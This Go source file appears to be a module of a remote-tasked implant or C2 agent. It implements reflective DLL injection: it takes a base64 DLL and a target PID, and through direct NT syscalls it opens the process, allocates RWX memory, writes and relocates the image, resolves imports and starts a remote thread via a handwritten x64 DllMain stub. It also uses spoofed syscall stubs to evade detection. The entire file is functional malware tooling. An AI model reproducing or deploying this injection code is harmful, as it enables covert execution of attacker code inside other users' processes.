//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

func handleReflectDLLInject(task Task, res *TaskResult) {
	if len(task.Data) == 0 {
		res.Error = "no DLL data provided"
		return
	}

	parts := strings.SplitN(task.Command, "|", 3)
	if len(parts) < 1 || parts[0] == "" {
		res.Error = "format: pid|exportName|exportArgs"
		return
	}

	pid, err := strconv.Atoi(parts[0])
	if err != nil {
		res.Error = "invalid PID: " + err.Error()
		return
	}

	exportName := ""
	exportArgs := ""
	if len(parts) > 1 {
		exportName = parts[1]
	}
	if len(parts) > 2 {
		exportArgs = parts[2]
	}

	dllData, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = "base64 decode failed: " + err.Error()
		return
	}

	result, err := reflectDLLInjectImpl(dllData, pid, exportName, exportArgs)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = result
	}
}

func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs string) (string, error) {
	if len(dllData) < 64 {
		return "", fmt.Errorf("PE data too small")
	}

	dos := (*imageDOSHeader)(unsafe.Pointer(&dllData[0]))
	if dos.eMagic != 0x5A4D {
		return "", fmt.Errorf("invalid DOS header")
	}

	ntOffset := uintptr(dos.eLfanew)
	nt32 := (*imageNTHeaders32)(unsafe.Pointer(&dllData[ntOffset]))
	if nt32.signature != 0x00004550 {
		return "", fmt.Errorf("invalid NT signature")
	}

	var is64Bit bool
	var prefImageBase uint64
	var sizeOfImage uint32
	var sizeOfHeaders uint32
	var entryPoint uint32
	var numberOfSections uint16
	var sectionOffset uintptr

	if nt32.optionalHeader.magic == 0x10B {
		is64Bit = false
		oh := (*imageOptionalHeader32)(unsafe.Pointer(&dllData[ntOffset+24]))
		prefImageBase = uint64(oh.imageBase)
		sizeOfImage = oh.sizeOfImage
		sizeOfHeaders = oh.sizeOfHeaders
		entryPoint = oh.addressOfEntryPoint
		numberOfSections = nt32.fileHeader.numberOfSections
		sectionOffset = ntOffset + 24 + uintptr(nt32.fileHeader.sizeOfOptionalHeader)
	} else if nt32.optionalHeader.magic == 0x20B {
		is64Bit = true
		oh := (*imageOptionalHeader64)(unsafe.Pointer(&dllData[ntOffset+24]))
		prefImageBase = oh.imageBase
		sizeOfImage = oh.sizeOfImage
		sizeOfHeaders = oh.sizeOfHeaders
		entryPoint = oh.addressOfEntryPoint
		numberOfSections = nt32.fileHeader.numberOfSections
		sectionOffset = ntOffset + 24 + uintptr(nt32.fileHeader.sizeOfOptionalHeader)
	} else {
		return "", fmt.Errorf("unsupported PE magic 0x%04X", nt32.optionalHeader.magic)
	}

	if sizeOfImage == 0 || sizeOfImage > 100*1024*1024 {
		return "", fmt.Errorf("invalid image size: %d", sizeOfImage)
	}

	mgr := getInjectManager()

	hProc, err := syscallNtOpenProcess(mgr, PROCESS_ALL_ACCESS, uint32(pid))
	if err != nil {
		return "", fmt.Errorf("NtOpenProcess(%d): %w", pid, err)
	}
	defer func() {
		if hProc != 0 {
			syscallNtClose(mgr, hProc)
		}
	}()

	imageBase, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(sizeOfImage), PAGE_EXECUTE_READWRITE)
	if err != nil {
		return "", fmt.Errorf("allocate remote memory: %w", err)
	}

	headerSize := sizeOfHeaders
	if uint32(len(dllData)) < headerSize {
		headerSize = uint32(len(dllData))
	}
	if err := syscallNtWriteVirtualMemory(mgr, hProc, imageBase, dllData[:headerSize]); err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("write headers: %w", err)
	}

	for i := uint16(0); i < numberOfSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(&dllData[sectionOffset+uintptr(i)*uintptr(unsafe.Sizeof(imageSectionHeader{}))]))
		if sec.sizeOfRawData == 0 || sec.pointerToRawData == 0 || sec.virtualAddress == 0 {
			continue
		}
		rawEnd := sec.pointerToRawData + sec.sizeOfRawData
		if rawEnd > uint32(len(dllData)) {
			rawEnd = uint32(len(dllData))
		}
		if rawEnd <= sec.pointerToRawData {
			continue
		}
		sectionData := dllData[sec.pointerToRawData:rawEnd]
		dstAddr := imageBase + uintptr(sec.virtualAddress)
		if err := syscallNtWriteVirtualMemory(mgr, hProc, dstAddr, sectionData); err != nil {
			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
			return "", fmt.Errorf("write section %d: %w", i, err)
		}
	}

	imageBaseDelta := uint64(imageBase) - prefImageBase

	if err := processRelocationsRemote(mgr, hProc, dllData, imageBase, imageBaseDelta, is64Bit, ntOffset); err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("relocations: %w", err)
	}

	if err := resolveImportsRemote(mgr, hProc, dllData, imageBase, is64Bit, ntOffset); err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("imports: %w", err)
	}

	if err := setRemoteSectionProtections(mgr, hProc, dllData, imageBase, numberOfSections, sectionOffset, is64Bit); err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("protections: %w", err)
	}

	if exportName != "" {
		exportRVA := findExportAddressInPE(dllData, exportName, ntOffset)
		if exportRVA == 0 {
			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
			return "", fmt.Errorf("export %s not found in DLL", exportName)
		}
		exportAddr := imageBase + uintptr(exportRVA)

		result := fmt.Sprintf("DLL mapped at 0x%X, calling export %s", imageBase, exportName)

		if exportArgs != "" {
			argBytes := append([]byte(exportArgs), 0)
			argAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(argBytes)), PAGE_READWRITE)
			if err != nil {
				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
				return "", fmt.Errorf("alloc args: %w", err)
			}
			if err := syscallNtWriteVirtualMemory(mgr, hProc, argAddr, argBytes); err != nil {
				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
				return "", fmt.Errorf("write args: %w", err)
			}

			hThread, err := syscallNtCreateThreadExParam(mgr, hProc, exportAddr, argAddr)
			if err != nil {
				syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
				_ = syscallNtFreeVirtualMemory(mgr, hProc, argAddr)
				return "", fmt.Errorf("create remote thread: %w", err)
			}

			ntWaitForThread(mgr, hThread)
			_ = syscallNtFreeVirtualMemory(mgr, hProc, argAddr)
			result += fmt.Sprintf(", thread at 0x%X", exportAddr)
			return result, nil
		}

		hThread, err := syscallNtCreateThreadExParam(mgr, hProc, exportAddr, 0)
		if err != nil {
			syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
			return "", fmt.Errorf("create remote thread: %w", err)
		}
		ntWaitForThread(mgr, hThread)
		result += fmt.Sprintf(", thread at 0x%X", exportAddr)
		return result, nil
	}

	if entryPoint == 0 {
		return fmt.Sprintf("DLL mapped into PID %d at 0x%X (no entry point)", pid, imageBase), nil
	}

	stubAddr, err := writeDllMainStubRemote(mgr, hProc, imageBase, imageBase+uintptr(entryPoint))
	if err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("write DllMain stub: %w", err)
	}

	hThread, err := syscallNtCreateThreadExParam(mgr, hProc, stubAddr, 0)
	if err != nil {
		syscallNtFreeVirtualMemory(mgr, hProc, imageBase)
		return "", fmt.Errorf("create remote thread: %w", err)
	}

	ntWaitForThread(mgr, hThread)
	return fmt.Sprintf("DLL injected into PID %d at 0x%X, entry 0x%X", pid, imageBase, imageBase+uintptr(entryPoint)), nil
}

func processRelocationsRemote(mgr *syscallManager, hProc uintptr, dllData []byte, imageBase uintptr, imageBaseDelta uint64, is64Bit bool, ntOffset uintptr) error {
	var dataDirAddr uint32
	if is64Bit {
		oh := (*imageOptionalHeader64)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[0].virtualAddress
	} else {
		oh := (*imageOptionalHeader32)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[0].virtualAddress
	}
	if dataDirAddr == 0 {
		return nil
	}

	relocFileOff := rvaToFileOffset(dllData, dataDirAddr, ntOffset)
	if relocFileOff == 0 || relocFileOff >= uint32(len(dllData)) {
		return nil
	}

	cursor := uintptr(relocFileOff)
	for {
		if cursor+8 > uintptr(len(dllData)) {
			break
		}
		reloc := (*imageBaseRelocation)(unsafe.Pointer(&dllData[cursor]))
		if reloc.virtualAddress == 0 || reloc.sizeOfBlock < 8 {
			break
		}

		numEntries := (reloc.sizeOfBlock - 8) / 2
		entriesStart := cursor + 8

		for j := uint32(0); j < numEntries; j++ {
			entryOff := entriesStart + uintptr(j)*2
			if entryOff+2 > uintptr(len(dllData)) {
				break
			}
			entry := *(*uint16)(unsafe.Pointer(&dllData[entryOff]))
			typ := uint8((entry >> 12) & 0x0F)
			offset := uint32(entry & 0x0FFF)

			if typ == relBasedAbs {
				continue
			}

			patchAddr := imageBase + uintptr(reloc.virtualAddress) + uintptr(offset)
			rva := reloc.virtualAddress + offset
			fileOff := rvaToFileOffset(dllData, rva, ntOffset)

			if is64Bit && typ == relBasedDir64 {
				if fileOff == 0 || fileOff+8 > uint32(len(dllData)) {
					continue
				}
				oldVal := *(*uint64)(unsafe.Pointer(&dllData[fileOff]))
				newVal := oldVal + imageBaseDelta
				valBytes := (*[8]byte)(unsafe.Pointer(&newVal))[:]
				_ = syscallNtWriteVirtualMemory(mgr, hProc, patchAddr, valBytes)
			} else if !is64Bit && typ == relBasedHighlow {
				if fileOff == 0 || fileOff+4 > uint32(len(dllData)) {
					continue
				}
				oldVal := *(*uint32)(unsafe.Pointer(&dllData[fileOff]))
				newVal := uint32(uint64(oldVal) + imageBaseDelta)
				valBytes := (*[4]byte)(unsafe.Pointer(&newVal))[:]
				_ = syscallNtWriteVirtualMemory(mgr, hProc, patchAddr, valBytes)
			}
		}
		cursor += uintptr(reloc.sizeOfBlock)
	}
	return nil
}

func resolveImportsRemote(mgr *syscallManager, hProc uintptr, dllData []byte, imageBase uintptr, is64Bit bool, ntOffset uintptr) error {
	var dataDirAddr uint32
	if is64Bit {
		oh := (*imageOptionalHeader64)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[1].virtualAddress
	} else {
		oh := (*imageOptionalHeader32)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[1].virtualAddress
	}
	if dataDirAddr == 0 {
		return nil
	}

	importFileOff := rvaToFileOffset(dllData, dataDirAddr, ntOffset)
	if importFileOff == 0 {
		return nil
	}

	thunkSize := uint32(8)
	if !is64Bit {
		thunkSize = 4
	}

	idx := uint32(0)
	descSize := uint32(unsafe.Sizeof(imageImportDescriptor{}))
	for {
		descOff := importFileOff + idx*descSize
		if descOff+descSize > uint32(len(dllData)) {
			break
		}
		impDesc := (*imageImportDescriptor)(unsafe.Pointer(&dllData[descOff]))
		if impDesc.name == 0 {
			break
		}
		if impDesc.originalFirstThunk == 0 && impDesc.firstThunk == 0 {
			idx++
			continue
		}

		nameOff := rvaToFileOffset(dllData, impDesc.name, ntOffset)
		if nameOff == 0 || nameOff >= uint32(len(dllData)) {
			idx++
			continue
		}
		dllName := goStringFromFilePtr(dllData, nameOff)
		if dllName == "" {
			idx++
			continue
		}

		dllHandle, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(unsafe.StringData(dllName))))
		if dllHandle == 0 {
			idx++
			continue
		}

		thunkRVA := impDesc.originalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = impDesc.firstThunk
		}

		firstThunkRVA := impDesc.firstThunk

		i := uint32(0)
		for {
			thunkFileOff := rvaToFileOffset(dllData, thunkRVA+i*thunkSize, ntOffset)
			if thunkFileOff == 0 || thunkFileOff+thunkSize > uint32(len(dllData)) {
				break
			}

			var thunkVal uint64
			if is64Bit {
				thunkVal = *(*uint64)(unsafe.Pointer(&dllData[thunkFileOff]))
			} else {
				thunkVal = uint64(*(*uint32)(unsafe.Pointer(&dllData[thunkFileOff])))
			}
			if thunkVal == 0 {
				break
			}

			var funcAddr uintptr
			if thunkVal&uint64(imageSnpByOrdinal) != 0 {
				ordinal := thunkVal & uint64(imageOrdFlag32)
				funcAddr, _, _ = procGetProcAddress.Call(dllHandle, uintptr(ordinal))
			} else {
				hintNameOff := rvaToFileOffset(dllData, uint32(thunkVal), ntOffset)
				if hintNameOff == 0 || hintNameOff+2 >= uint32(len(dllData)) {
					i++
					continue
				}
				nameOff := hintNameOff + 2
				funcName := goStringFromFilePtr(dllData, nameOff)
				if funcName != "" {
					funcAddr, _, _ = procGetProcAddress.Call(dllHandle, uintptr(unsafe.Pointer(unsafe.StringData(funcName))))
				}
			}

			if funcAddr != 0 {
				iatAddr := imageBase + uintptr(firstThunkRVA) + uintptr(i)*uintptr(thunkSize)
				if is64Bit {
					valBytes := (*[8]byte)(unsafe.Pointer(&funcAddr))[:]
					_ = syscallNtWriteVirtualMemory(mgr, hProc, iatAddr, valBytes)
				} else {
					addr32 := uint32(funcAddr)
					valBytes := (*[4]byte)(unsafe.Pointer(&addr32))[:]
					_ = syscallNtWriteVirtualMemory(mgr, hProc, iatAddr, valBytes)
				}
			}
			i++
		}
		idx++
	}
	return nil
}

func setRemoteSectionProtections(mgr *syscallManager, hProc uintptr, dllData []byte, imageBase uintptr, numSections uint16, sectionOffset uintptr, is64Bit bool) error {
	for i := uint16(0); i < numSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(&dllData[sectionOffset+uintptr(i)*uintptr(unsafe.Sizeof(imageSectionHeader{}))]))
		if sec.virtualAddress == 0 || sec.virtualSize == 0 {
			continue
		}

		prot := uint32(pageReadwrite)
		if sec.characteristics&imageScnMemExecute != 0 {
			if sec.characteristics&imageScnMemWrite != 0 {
				prot = pageExecuteReadwrite
			} else {
				prot = pageExecuteRead
			}
		} else if sec.characteristics&imageScnMemRead != 0 {
			if sec.characteristics&imageScnMemWrite != 0 {
				prot = pageReadwrite
			}
		}

		if sec.characteristics&imageScnMemDiscardable != 0 {
			continue
		}

		secAddr := imageBase + uintptr(sec.virtualAddress)
		secSize := uintptr(sec.virtualSize)
		_, _ = syscallNtProtectVirtualMemory(mgr, hProc, secAddr, secSize, prot)
	}
	return nil
}

func writeDllMainStubRemote(mgr *syscallManager, hProc uintptr, imageBase uintptr, entryPoint uintptr) (uintptr, error) {
	stub := make([]byte, 0, 32)

	stub = append(stub, 0x48, 0xB9)
	stub = append(stub, byte(imageBase), byte(imageBase>>8), byte(imageBase>>16), byte(imageBase>>24),
		byte(imageBase>>32), byte(imageBase>>40), byte(imageBase>>48), byte(imageBase>>56))

	stub = append(stub, 0xBA, 0x01, 0x00, 0x00, 0x00)

	stub = append(stub, 0x45, 0x31, 0xC0)

	stub = append(stub, 0x48, 0xB8)
	stub = append(stub, byte(entryPoint), byte(entryPoint>>8), byte(entryPoint>>16), byte(entryPoint>>24),
		byte(entryPoint>>32), byte(entryPoint>>40), byte(entryPoint>>48), byte(entryPoint>>56))

	stub = append(stub, 0xFF, 0xD0)

	stub = append(stub, 0xC3)

	stubAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(stub)), PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("alloc stub: %w", err)
	}

	if err := syscallNtWriteVirtualMemory(mgr, hProc, stubAddr, stub); err != nil {
		_ = syscallNtFreeVirtualMemory(mgr, hProc, stubAddr)
		return 0, fmt.Errorf("write stub: %w", err)
	}

	var oldProt uint32
	_, err = syscallNtProtectVirtualMemory(mgr, hProc, stubAddr, uintptr(len(stub)), PAGE_EXECUTE_READ)
	if err != nil {
		return stubAddr, nil
	}
	_ = oldProt
	return stubAddr, nil
}

func ntWaitForThread(mgr *syscallManager, hThread uintptr) {
	stub, err := mgr.getSpoofedStub("NtWaitForSingleObject")
	if err != nil {
		stub, err = mgr.getStub("NtWaitForSingleObject")
	}
	if err != nil {
		return
	}
	syscall.Syscall6(stub, 3, hThread, 0, 0, 0, 0, 0)
}

func rvaToFileOffset(dllData []byte, rva uint32, ntOffset uintptr) uint32 {
	if rva == 0 {
		return 0
	}
	nt32 := (*imageNTHeaders32)(unsafe.Pointer(&dllData[ntOffset]))
	numSections := nt32.fileHeader.numberOfSections
	sectionOffset := ntOffset + 24 + uintptr(nt32.fileHeader.sizeOfOptionalHeader)

	for i := uint16(0); i < numSections; i++ {
		sec := (*imageSectionHeader)(unsafe.Pointer(&dllData[sectionOffset+uintptr(i)*uintptr(unsafe.Sizeof(imageSectionHeader{}))]))
		if rva >= sec.virtualAddress && rva < sec.virtualAddress+sec.virtualSize {
			if sec.pointerToRawData == 0 {
				return 0
			}
			return sec.pointerToRawData + (rva - sec.virtualAddress)
		}
	}
	return 0
}

func goStringFromFilePtr(data []byte, offset uint32) string {
	if offset >= uint32(len(data)) {
		return ""
	}
	end := offset
	for end < uint32(len(data)) && data[end] != 0 {
		end++
	}
	return string(data[offset:end])
}

func findExportAddressInPE(dllData []byte, exportName string, ntOffset uintptr) uint32 {
	var dataDirAddr uint32
	nt32 := (*imageNTHeaders32)(unsafe.Pointer(&dllData[ntOffset]))
	if nt32.optionalHeader.magic == 0x20B {
		oh := (*imageOptionalHeader64)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[0].virtualAddress
	} else {
		oh := (*imageOptionalHeader32)(unsafe.Pointer(&dllData[ntOffset+24]))
		dataDirAddr = oh.dataDirectory[0].virtualAddress
	}
	if dataDirAddr == 0 {
		return 0
	}

	exportFileOff := rvaToFileOffset(dllData, dataDirAddr, ntOffset)
	if exportFileOff == 0 || exportFileOff+uint32(unsafe.Sizeof(imageExportDirectory{})) > uint32(len(dllData)) {
		return 0
	}

	exp := (*imageExportDirectory)(unsafe.Pointer(&dllData[exportFileOff]))
	if exp.numberOfNames == 0 || exp.addressOfFunctions == 0 || exp.addressOfNames == 0 {
		return 0
	}

	funcArrayFileOff := rvaToFileOffset(dllData, exp.addressOfFunctions, ntOffset)
	nameArrayFileOff := rvaToFileOffset(dllData, exp.addressOfNames, ntOffset)
	ordArrayFileOff := rvaToFileOffset(dllData, exp.addressOfNameOrdinals, ntOffset)

	if funcArrayFileOff == 0 || nameArrayFileOff == 0 || ordArrayFileOff == 0 {
		return 0
	}

	for i := uint32(0); i < exp.numberOfNames; i++ {
		nameOff := nameArrayFileOff + i*4
		if nameOff+4 > uint32(len(dllData)) {
			break
		}
		nameRVA := *(*uint32)(unsafe.Pointer(&dllData[nameOff]))
		nameFileOff := rvaToFileOffset(dllData, nameRVA, ntOffset)
		if nameFileOff == 0 || nameFileOff >= uint32(len(dllData)) {
			continue
		}
		name := goStringFromFilePtr(dllData, nameFileOff)
		if name == exportName {
			ordOff := ordArrayFileOff + i*2
			if ordOff+2 > uint32(len(dllData)) {
				break
			}
			ordinal := *(*uint16)(unsafe.Pointer(&dllData[ordOff]))
			funcOff := funcArrayFileOff + uint32(ordinal)*4
			if funcOff+4 > uint32(len(dllData)) {
				break
			}
			funcRVA := *(*uint32)(unsafe.Pointer(&dllData[funcOff]))
			return funcRVA
		}
	}
	return 0
}
